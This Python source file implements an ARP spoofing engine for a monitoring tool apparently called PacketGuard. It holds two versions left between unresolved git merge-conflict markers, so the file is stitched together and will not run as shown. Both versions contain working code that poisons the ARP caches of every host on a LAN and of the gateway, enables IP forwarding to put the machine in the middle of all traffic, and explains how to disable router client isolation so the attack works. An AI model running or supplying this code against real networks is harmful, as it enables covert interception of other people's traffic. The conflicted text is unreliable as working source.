#!/usr/bin/env python3
"""
<<<<<<< HEAD
ARP Spoof Engine - intercepts all LAN traffic through this machine.
Controlled lab use only. Run as Administrator.
"""
import time
import threading
import subprocess
import platform
import logging
import re

log = logging.getLogger(__name__)

_running      = False
_spoof_thread = None

# Explicit Wi-Fi interface (Intel Dual Band Wireless-AC 8265)
WIFI_IFACE = iface="\\Device\\NPF_{E40F339E-DE89-485A-8B78-E49A7F7C76FD}"


def _get_mac_from_cache(ip: str):
    """Read MAC from Windows ARP cache (arp -a) — works on Wi-Fi."""
    try:
        out = subprocess.check_output(f"arp -a {ip}", shell=True).decode(errors="ignore")
        match = re.search(r"([\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2})", out, re.IGNORECASE)
        if match:
            return match.group(1).replace("-", ":")
    except Exception:
        pass
    return None


def _ping_then_get_mac(ip: str):
    """Ping IP to populate ARP cache, then read MAC from cache."""
    try:
        subprocess.run(f"ping -n 1 -w 1000 {ip}", shell=True,
                       capture_output=True)
    except Exception:
        pass
    return _get_mac_from_cache(ip)


def _get_gateway():
    """Auto-detect default gateway IP."""
    try:
        out = subprocess.check_output("ipconfig", shell=True).decode(errors="ignore")
        match = re.search(r"Default Gateway[^\d]*(\d+\.\d+\.\d+\.\d+)", out)
        return match.group(1) if match else None
    except Exception:
        return None


def _scan_hosts(subnet: str):
    """
    Ping sweep to populate ARP cache, then read all entries.
    Works on Wi-Fi where ARP broadcast replies are filtered.
    """
    print(f"[ARP] Pinging {subnet}.0/24 to populate ARP cache...")
    # Ping all hosts in subnet quickly
    threads = []
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        t = threading.Thread(
            target=lambda h: subprocess.run(
                f"ping -n 1 -w 300 {h}", shell=True, capture_output=True),
            args=(ip,), daemon=True
        )
        threads.append(t)
        t.start()
    # Wait for pings to finish
    for t in threads:
        t.join(timeout=2)

    # Read full ARP cache
    print("[ARP] Reading ARP cache for live hosts...")
    try:
        out = subprocess.check_output("arp -a", shell=True).decode(errors="ignore")
        hosts = []
        for line in out.splitlines():
            # Match lines like: 192.168.1.5    aa-bb-cc-dd-ee-ff    dynamic
            m = re.match(
                r"\s+(\d+\.\d+\.\d+\.\d+)\s+([\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2})\s+dynamic",
                line, re.IGNORECASE
            )
            if m:
                ip  = m.group(1)
                mac = m.group(2).replace("-", ":")
                if ip.startswith(subnet):
                    hosts.append((ip, mac))
        return hosts
=======
ARP Spoof Engine - PacketGuard
Performs ARP poisoning so all LAN traffic is routed through this PC,
allowing PacketGuard to capture packets from every device on the network.

HOW IT WORKS
  1. We tell every device: "I (this PC) am the gateway"
  2. We tell the gateway: "I (this PC) am each device"
  3. All traffic now flows through us — we capture it, then forward it
  4. On stop we restore the real ARP entries so the network recovers

REQUIREMENTS
  - Npcap installed and running
  - App running as Administrator
  - Router "Client/AP Isolation" DISABLED (see router admin → Wireless → Security)
    Without this, ARP packets between clients are silently dropped by the router.
"""
import json
import logging
import os
import subprocess
import threading

log = logging.getLogger(__name__)

try:
    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf as _scapy_conf
    _scapy_conf.verb = 0
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

BASE_DIR        = os.path.dirname(os.path.abspath(__file__))
DEVICES_FILE    = os.path.join(BASE_DIR, "network_devices.json")
_INTERVAL       = 2.0   # seconds between ARP refresh bursts
_STOP           = threading.Event()
_lock           = threading.Lock()
_state = {
    "running":          False,
    "targets_poisoned": 0,
    "gateway_ip":       None,
    "gateway_mac":      None,
    "our_mac":          None,
    "isolation_detected": False,
    "error":            None,
}


# ── Helpers ───────────────────────────────────────────────────────

def _get_state() -> dict:
    with _lock:
        return dict(_state)


def _set(key, value):
    with _lock:
        _state[key] = value


def _ip_forwarding_enable():
    """Enable Windows IP routing so we forward intercepted packets."""
    try:
        subprocess.run(
            ["netsh", "int", "ipv4", "set", "global", "forwarding=enabled"],
            capture_output=True, timeout=5
        )
        log.info("[ARP] IP forwarding enabled.")
    except Exception as e:
        log.warning(f"[ARP] Could not enable IP forwarding: {e}")


def _ip_forwarding_disable():
    """Restore default (no forwarding)."""
    try:
        subprocess.run(
            ["netsh", "int", "ipv4", "set", "global", "forwarding=disabled"],
            capture_output=True, timeout=5
        )
    except Exception:
        pass


def _get_mac(ip: str, iface: str) -> str:
    """Resolve MAC address for an IP via ARP request."""
    try:
        answered, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=iface, timeout=2, retry=1, verbose=False
        )
        if answered:
            return answered[0][1].hwsrc
    except Exception:
        pass
    return ""


def _our_mac(iface: str) -> str:
    try:
        return get_if_hwaddr(iface)
    except Exception:
        return ""


def _poison_packet(target_ip: str, target_mac: str,
                   spoof_ip: str, our_mac: str, iface: str) -> None:
    """Send one ARP reply: tell target_ip that spoof_ip is at our_mac."""
    try:
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip, hwdst=target_mac,
            psrc=spoof_ip,  hwsrc=our_mac,
        )
        sendp(pkt, iface=iface, verbose=False)
    except Exception:
        pass


def _restore_packet(target_ip: str, target_mac: str,
                    real_ip: str, real_mac: str, iface: str) -> None:
    """Restore real ARP entry for target_ip."""
    try:
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip, hwdst=target_mac,
            psrc=real_ip,   hwsrc=real_mac,
        )
        sendp(pkt, iface=iface, count=4, verbose=False)
    except Exception:
        pass


def _check_isolation(gateway_ip: str, iface: str) -> bool:
    """
    Detect if client/AP isolation is active by checking whether we can
    reach the gateway via ARP. Isolation blocks client↔client ARP but
    should still allow client↔gateway ARP. If we can't even reach the
    gateway, the interface or Npcap is the problem; if targets don't
    respond to our spoofed packets, isolation is likely active.
    Returns True if isolation is suspected.
    """
    mac = _get_mac(gateway_ip, iface)
    if not mac:
        log.warning("[ARP] Cannot reach gateway via ARP — Npcap issue or wrong interface.")
        return True
    return False


def _load_targets() -> list:
    """Load device list, excluding this PC and the gateway."""
    try:
        with open(DEVICES_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        return [d for d in data.get("devices", [])
                if not d.get("is_local") and not d.get("is_gateway")
                and d.get("ip") and d.get("mac") and d["mac"] != "Unknown"]
>>>>>>> 943b830 (Added AI IDS modules and ML pipeline)
    except Exception:
        return []


<<<<<<< HEAD
def _spoof(target_ip, target_mac, spoof_ip):
    """Tell target that spoof_ip is at our MAC (poisoning)."""
    from scapy.all import sendp, Ether, ARP
    sendp(
        Ether(dst=target_mac) / ARP(op=2, pdst=target_ip,
              hwdst=target_mac, psrc=spoof_ip),
        iface=WIFI_IFACE, verbose=False
    )


def _restore(target_ip, target_mac, real_ip, real_mac):
    """Send correct ARP reply to undo poisoning."""
    from scapy.all import sendp, Ether, ARP
    sendp(
        Ether(dst=target_mac) / ARP(op=2, pdst=target_ip,
              hwdst=target_mac, psrc=real_ip, hwsrc=real_mac),
        iface=WIFI_IFACE, count=5, verbose=False
    )


def _enable_ip_forward():
    """Enable IP forwarding so packets are relayed, not dropped."""
    if platform.system() == "Windows":
        subprocess.run([
            "reg", "add",
            r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
            "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"
        ], capture_output=True)
        print("[ARP] IP forwarding enabled (Windows)")
    else:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[ARP] IP forwarding enabled (Linux)")


def start_spoofing(subnet: str = "192.168.1") -> bool:
    """Start ARP spoofing all hosts on subnet."""
    global _running, _spoof_thread

    if _running:
        print("[ARP] Already running.")
        return True

    _enable_ip_forward()

    gateway_ip = _get_gateway()
    if not gateway_ip:
        print("[ARP] Could not detect gateway.")
        return False
    print(f"[ARP] Gateway: {gateway_ip}")

    # Use ping+cache instead of raw ARP request (works on Wi-Fi)
    gateway_mac = _ping_then_get_mac(gateway_ip)
    if not gateway_mac:
        print("[ARP] Could not get gateway MAC from ARP cache.")
        return False
    print(f"[ARP] Gateway MAC: {gateway_mac}")

    hosts = [
        (ip, mac) for ip, mac in _scan_hosts(subnet)
        if ip != gateway_ip
    ]
    if not hosts:
        print("[ARP] No hosts found on subnet.")
        return False
    print(f"[ARP] Intercepting {len(hosts)} hosts: {[h[0] for h in hosts]}")

    _running = True

    def _loop():
        while _running:
            for host_ip, host_mac in hosts:
                _spoof(host_ip,    host_mac,    gateway_ip)
                _spoof(gateway_ip, gateway_mac, host_ip)
            time.sleep(2)

        # Cleanup
        print("[ARP] Restoring ARP tables...")
        for host_ip, host_mac in hosts:
            real_mac = _ping_then_get_mac(host_ip) or host_mac
            _restore(host_ip,    host_mac,    gateway_ip, gateway_mac)
            _restore(gateway_ip, gateway_mac, host_ip,    real_mac)
        print("[ARP] ARP tables restored. Spoofing stopped.")

    _spoof_thread = threading.Thread(target=_loop, daemon=True, name="arp-spoof")
    _spoof_thread.start()
=======
# ── Main spoof loop ───────────────────────────────────────────────

def _spoof_loop(gateway_ip: str, gateway_mac: str,
                our_mac_addr: str, iface: str):
    """
    Continuously poison ARP caches of all LAN devices.
    Runs until _STOP is set.
    """
    log.info(f"[ARP] Spoof loop started. Gateway {gateway_ip} ({gateway_mac})")

    while not _STOP.is_set():
        targets = _load_targets()
        _set("targets_poisoned", len(targets))

        for dev in targets:
            tip = dev["ip"]
            tmac = dev["mac"]
            # Tell target: "I am the gateway"
            _poison_packet(tip, tmac, gateway_ip, our_mac_addr, iface)
            # Tell gateway: "I am the target"
            _poison_packet(gateway_ip, gateway_mac, tip, our_mac_addr, iface)

        _STOP.wait(_INTERVAL)

    # ── Restore ────────────────────────────────────────────────
    log.info("[ARP] Restoring ARP tables...")
    targets = _load_targets()
    for dev in targets:
        tip = dev["ip"]
        tmac = dev["mac"]
        _restore_packet(tip,        tmac,        gateway_ip, gateway_mac, iface)
        _restore_packet(gateway_ip, gateway_mac, tip,        tmac,        iface)

    _ip_forwarding_disable()
    log.info("[ARP] Spoof loop stopped, ARP tables restored.")


# ── Public API ────────────────────────────────────────────────────

def start_spoofing(iface: str = None) -> bool:
    """
    Start ARP spoofing.  Returns True if successfully started.
    Requires Npcap, Administrator rights, and client isolation DISABLED.
    """
    if not SCAPY_OK:
        _set("error", "Scapy/Npcap not available.")
        return False

    if _state["running"]:
        return True

    # Resolve interface — use _pick_interface() which prefers Ethernet over WiFi
    if not iface:
        try:
            from live_monitor import _pick_interface
            iface = _pick_interface()
        except Exception:
            _set("error", "Cannot determine capture interface.")
            return False

    log.info(f"[ARP] Using interface: {iface}")
    print(f"[ARP] Using interface: {iface}")

    # Resolve gateway
    try:
        import re
        out = subprocess.check_output("ipconfig", shell=True).decode(errors="ignore")
        m = re.search(r"Default Gateway[^\d]*(\d+\.\d+\.\d+\.\d+)", out)
        gw_ip = m.group(1) if m else None
    except Exception:
        gw_ip = None

    if not gw_ip:
        _set("error", "Could not determine gateway IP.")
        return False

    gw_mac = _get_mac(gw_ip, iface)
    if not gw_mac:
        _set("error", f"Cannot ARP resolve gateway {gw_ip}. "
                      "Check Npcap is installed and app runs as Administrator.")
        return False

    our_mac_addr = _our_mac(iface)
    if not our_mac_addr:
        _set("error", "Cannot read local MAC address.")
        return False

    # Check for client isolation
    isolation = _check_isolation(gw_ip, iface)
    _set("isolation_detected", isolation)
    if isolation:
        log.warning("[ARP] Client/AP isolation may be active. "
                    "Disable it in router admin → Wireless → Security.")

    _ip_forwarding_enable()

    _STOP.clear()
    with _lock:
        _state.update({
            "running":    True,
            "gateway_ip": gw_ip,
            "gateway_mac": gw_mac,
            "our_mac":    our_mac_addr,
            "error":      None,
        })

    threading.Thread(
        target=_spoof_loop,
        args=(gw_ip, gw_mac, our_mac_addr, iface),
        daemon=True,
        name="arp-spoof"
    ).start()

    log.info(f"[ARP] Spoofing started. Gateway {gw_ip} ({gw_mac}), our MAC {our_mac_addr}")
>>>>>>> 943b830 (Added AI IDS modules and ML pipeline)
    return True


def stop_spoofing():
<<<<<<< HEAD
    global _running
    _running = False
=======
    """Stop ARP spoofing and restore ARP tables."""
    _STOP.set()
    _set("running", False)


def get_status() -> dict:
    return _get_state()
>>>>>>> 943b830 (Added AI IDS modules and ML pipeline)
